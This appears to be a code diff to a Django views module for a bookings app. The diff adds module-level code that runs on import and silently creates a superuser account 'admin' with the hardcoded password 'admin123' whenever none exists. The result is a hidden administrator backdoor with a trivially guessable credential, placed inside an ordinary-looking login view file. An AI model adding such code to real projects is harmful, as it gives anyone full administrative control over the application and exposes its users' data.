@@ -5,7 +5,15 @@ from django.contrib import messages
 from django.contrib.auth import get_user_model
 from apps.bookings.models import Booking
 
-User = get_user_model()
+
+from apps.accounts.models import User
+
+if not User.objects.filter(username="admin").exists():
+    user = User.objects.create(username="admin", email="admin@gmail.com")
+    user.set_password("admin123")
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
 
 
 def user_login(request):
